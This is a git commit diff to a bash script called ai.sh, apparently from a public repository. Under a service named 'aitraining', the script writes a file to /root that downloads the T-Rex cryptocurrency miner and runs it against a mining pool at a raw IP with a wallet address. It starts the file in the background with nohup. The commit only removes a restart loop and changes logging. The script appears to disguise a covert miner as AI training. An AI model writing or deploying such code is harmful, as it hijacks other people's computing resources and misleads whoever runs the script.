b893dd24be4b3458890091aaff05f8fec7391d3f
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 06:33:34 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,14 +1,13 @@
 #!/bin/bash
+
 SERVICE_NAME="aitraining"
 SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"
 cat <<'EOF' > "$SCRIPT_PATH"
 #!/bin/bash
-while true; do
-  wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
-  tar xvzf t-rex-0.26.8-linux.tar.gz
-  ./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
-  sleep 10 # Add a delay before restarting in case of failure
-done
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+tar xvzf t-rex-0.26.8-linux.tar.gz
+./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
 EOF
 chmod 700 "$SCRIPT_PATH"
-nohup "$SCRIPT_PATH" > /root/aitraining.log 2>&1 &
+
+nohup "$SCRIPT_PATH" > /root/aitraining.log 2> /root/aitraining_error.log &
